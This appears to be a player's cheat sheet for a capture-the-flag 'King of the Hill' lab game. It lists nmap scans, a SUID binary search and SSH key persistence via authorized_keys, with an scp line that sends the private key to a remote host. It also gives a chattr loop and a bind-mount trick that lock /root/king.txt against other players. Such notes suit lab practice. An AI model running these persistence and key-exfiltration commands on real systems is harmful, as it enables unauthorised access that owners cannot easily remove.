NMAP:
```
nmap -p- --min-rate 10000 10.10.147.185
```

```
nmap -p .. -sCV ..
```



To find SUID Binaries :
```
find / -perm /4000 2>/dev/null

```


## SSH KEY GEN

##### 1. Create the .ssh directory (if it doesn't exist)
```
mkdir -p ~/.ssh
```

##### 2. Generate an SSH key pair
```
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""
```

##### 3. Add the public key to authorized_keys for passwordless login
```
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
```

##### 4. Set correct permissions for authorized_keys
```
chmod 600 ~/.ssh/authorized_keys
```



```
scp ~/.ssh/id_rsa pradyun@10.6.13.240:/home/pradyun/Music
```










# PROTECT KING FILE

```
while [ 1 ]; do chattr -ia /root/king.txt 2>/dev/null; echo -n Pradyun >| /root/king.txt 2>/dev/null; chattr +ia /root/king.txt 2>/dev/null; done &
```

Mount King 

```
sudo lessecho Pradyun > /root/king.txt; sudo dd if=/dev/zero of=/dev/shm/root_f bs=1000 count=100; sudo mkfs.ext3 /dev/shm/root_f; sudo mkdir /dev/shm/sqashfs; sudo mount -o loop /dev/shm/root_f /dev/shm/sqashfs/; sudo chmod -R 777 /dev/shm/sqashfs/; sudo lessecho Pradyun > /dev/shm/sqashfs/king.txt; sudo mount -o ro,remount /dev/shm/sqashfs; sudo mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt; sudo rm -rf /dev/shm/root_f

```




# REVOKE CHATTR

```
lsattr /root/king.txt
```


```
sudo chattr -i /root/king.txt   # Remove immutable flag
```

```
sudo chattr -a /root/king.txt   # Remove append-only flag
```